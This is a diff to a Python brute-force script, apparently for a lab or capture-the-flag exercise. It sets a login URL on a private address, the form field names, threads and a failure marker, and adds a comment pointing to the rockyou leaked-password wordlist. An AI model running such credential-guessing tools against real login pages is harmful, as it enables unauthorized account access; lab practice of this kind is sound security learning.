@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+# Requirements: pip3 install requests
 import requests
 from concurrent.futures import ThreadPoolExecutor
 import threading
@@ -5,10 +7,17 @@ import threading
 TARGET_URL = "http://10.11.249.19/index.php?page=signin&Login=Login"
 USERNAME_FIELD = "username"
 PASSWORD_FIELD = "password"
-USERLIST = ""
-PASSLIST = ""
 THREADS = 5
 FAIL_STRING = "WrongAnswer.gif"
+
+
+"""
+Useful wordlists
+https://github.com/danielmiessler/SecLists:
+- https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
+"""
+USERLIST = ""
+PASSLIST = ""
 
 session = requests.Session()
 found_event = threading.Event()
